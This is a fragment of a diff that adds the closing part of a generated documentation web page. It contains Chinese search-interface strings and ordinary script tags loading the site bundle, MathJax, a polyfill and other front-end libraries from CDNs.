"\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version.title": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.9c69f0bc.min.js"></script>
+      
+        <script src="../assets/javascripts/mathjax.js"></script>
+      
+        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/tablesort@5.2.1/src/tablesort.min.js"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/pangu@4.0.7/dist/browser/pangu.min.js"></script>
+      
+        <script src="../assets/javascripts/doc_addins.js"></script>
+      
+        <script src="../assets/javascripts/share.js"></script>
+      
+    
+  </body>
+</html>
